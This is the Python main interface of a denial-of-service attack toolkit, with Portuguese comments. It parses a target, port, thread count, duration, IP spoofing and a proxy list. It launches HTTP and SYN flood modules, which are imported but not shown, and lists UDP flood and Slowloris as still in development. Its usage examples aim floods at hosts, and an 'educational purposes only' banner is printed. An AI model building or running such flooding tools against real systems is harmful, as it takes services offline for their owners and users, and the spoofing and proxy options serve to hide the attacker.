#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DoS Attack Toolkit - Interface Principal
APENAS PARA FINS EDUCACIONAIS
"""

import argparse
import sys
import time
from colorama import init, Fore, Style
import os

# Importar módulos
from tools.http_flood import HTTPFlood
from tools.syn_flood import SYNFlood
from tools.udp_flood import UDPFlood
from tools.slowloris import Slowloris

init(autoreset=True)

class DoSToolkit:
    def __init__(self):
        self.version = "1.0.0"
        self.author = "Seu Nome"
        
    def print_banner(self):
        banner = f"""
{Fore.RED}
    ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
    ██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
    ██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     ███████╗
    ██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
    ██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
    ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{Style.RESET_ALL}
{Fore.YELLOW}
╔══════════════════════════════════════════════════════════════════════════╗
║                     APENAS PARA FINS EDUCACIONAIS                        ║
║              Use apenas em sistemas que você possui autorização          ║
╚══════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)
        print(f"{Fore.CYAN}Versão: {self.version} | Autor: {self.author}\n")
    
    def check_root(self):
        """Verifica se está rodando como root (para alguns ataques)"""
        if os.geteuid() != 0:
            print(f"{Fore.YELLOW}[!] Alguns ataques (SYN Flood) precisam de root")
            print(f"{Fore.YELLOW}[!] Execute com: sudo python main.py\n")
    
    def confirm_attack(self, attack_type, target):
        """Confirmação do ataque"""
        print(f"\n{Fore.RED}╔════════════════════════════════════════╗")
        print(f"║       CONFIRMAR ATAQUE               ║")
        print(f"╠════════════════════════════════════════╣")
        print(f"║ Tipo: {attack_type:<32}║")
        print(f"║ Alvo: {target:<32}║")
        print(f"╚════════════════════════════════════════╝{Style.RESET_ALL}")
        
        response = input(f"\n{Fore.YELLOW}Tem certeza que deseja continuar? (s/N): {Style.RESET_ALL}")
        return response.lower() == 's'
    
    def run_http_flood(self, args):
        """Executa HTTP Flood"""
        print(f"{Fore.CYAN}[*] Configurando HTTP Flood...")
        
        attack = HTTPFlood(
            target=args.target,
            threads=args.threads,
            duration=args.time
        )
        
        attack.start()
    
    def run_syn_flood(self, args):
        """Executa SYN Flood"""
        print(f"{Fore.CYAN}[*] Configurando SYN Flood...")
        
        attack = SYNFlood(
            target_ip=args.target,
            target_port=args.port,
            threads=args.threads,
            duration=args.time,
            spoof=not args.no_spoof
        )
        
        attack.start()
    
    def main(self):
        """Função principal"""
        parser = argparse.ArgumentParser(
            description='DoS Attack Toolkit - APENAS PARA ESTUDO',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Exemplos de uso:
  python main.py --type http --target http://exemplo.com --threads 100 --time 60
  python main.py --type syn --target 192.168.1.100 --port 80 --threads 50 --time 30
  python main.py --type udp --target 192.168.1.100 --port 53 --threads 10 --time 20
            """
        )
        
        parser.add_argument('--type', '-t', 
                          choices=['http', 'syn', 'udp', 'slowloris'],
                          required=True,
                          help='Tipo de ataque')
        
        parser.add_argument('--target', required=True,
                          help='Alvo (URL ou IP)')
        
        parser.add_argument('--port', type=int, default=80,
                          help='Porta alvo (padrão: 80)')
        
        parser.add_argument('--threads', type=int, default=50,
                          help='Número de threads (padrão: 50)')
        
        parser.add_argument('--time', type=int, default=30,
                          help='Duração em segundos (padrão: 30)')
        
        parser.add_argument('--no-spoof', action='store_true',
                          help='Não usar IP spoofing (SYN flood)')
        
        parser.add_argument('--proxy-file', 
                          help='Arquivo com lista de proxies')
        
        args = parser.parse_args()
        
        # Mostrar banner
        self.print_banner()
        self.check_root()
        
        # Confirmar ataque
        if not self.confirm_attack(args.type.upper(), args.target):
            print(f"{Fore.GREEN}[✓] Ataque cancelado.")
            return
        
        print(f"{Fore.YELLOW}[!] Iniciando em 3 segundos...")
        time.sleep(3)
        
        # Executar ataque escolhido
        try:
            if args.type == 'http':
                self.run_http_flood(args)
            elif args.type == 'syn':
                self.run_syn_flood(args)
            elif args.type == 'udp':
                print(f"{Fore.RED}[!] UDP Flood em desenvolvimento")
            elif args.type == 'slowloris':
                print(f"{Fore.RED}[!] Slowloris em desenvolvimento")
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Ataque interrompido pelo usuário")
        except Exception as e:
            print(f"{Fore.RED}[!] Erro: {e}")
        
        print(f"{Fore.GREEN}[✓] Programa finalizado")

if __name__ == "__main__":
    toolkit = DoSToolkit()
    toolkit.main()
